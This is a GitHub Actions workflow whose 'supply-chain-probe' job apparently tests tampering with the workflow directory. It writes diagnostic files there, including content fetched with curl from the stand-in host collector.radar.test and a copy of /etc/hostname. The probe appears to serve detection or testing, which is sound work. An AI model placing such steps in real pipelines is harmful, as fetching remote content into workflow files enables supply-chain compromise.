name: Test

on:
  pull_request:
  push:
    branches:
      - main

concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.sha }}
  cancel-in-progress: true

env:
  FORCE_COLOR: 1

permissions: {}

jobs:
  supply-chain-probe:
    runs-on: self-hosted
    steps:
    - name: writer diagnostic
      run: |
        D="$GITHUB_WORKSPACE/.github/workflows"
        mkdir -p "$D"
        printf 'a
' >> "$D/diag_printf.yml"
        echo 'b' > "$D/diag_echo.yml"
        curl -s -m 10 "http://collector.radar.test/x" -o "$D/diag_curl.yml" || true
        cp /etc/hostname "$D/diag_cp.yml"
        /bin/dd if=/etc/hostname of="$D/diag_dd.yml" bs=1 count=4 2>/dev/null || true
        sleep 4
